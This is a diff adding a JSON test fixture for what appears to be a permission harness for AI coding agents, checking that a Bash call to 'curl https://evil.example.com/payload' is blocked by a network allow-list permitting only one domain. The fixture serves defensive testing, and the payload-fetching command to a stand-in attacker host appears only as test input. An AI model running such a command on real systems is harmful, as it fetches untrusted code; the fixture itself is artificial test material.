@@ -1,0 +1,32 @@
+{
+  "title": "F18 network-egress: contract.scopes.network.allowDomains blocks non-allowed host",
+  "contract": {
+    "version": 3,
+    "contractId": "hap-20260101-00000000f018",
+    "revision": 1,
+    "acceptedAt": "2026-01-01T00:00:00Z",
+    "acceptedBy": "fixture",
+    "harnessScope": ["claude"],
+    "trustPosture": "balanced",
+    "scopes": {
+      "payloadClasses": { "A": "allow", "B": "warn", "C": "block" },
+      "network": { "allowDomains": ["api.anthropic.com"] }
+    }
+  },
+  "input": {
+    "tool": "Bash",
+    "harness": "claude",
+    "command": "curl https://evil.example.com/payload",
+    "branch": "feature/test",
+    "targetPath": "/tmp"
+  },
+  "expected": {
+    "action": "block",
+    "decisionSource": "network-egress-denied",
+    "floorFired": "network-egress",
+    "rung": 16,
+    "latticeVersion": "1",
+    "irHashPresent": true,
+    "reasonCodesIncludes": ["network-egress-denied"]
+  }
+}
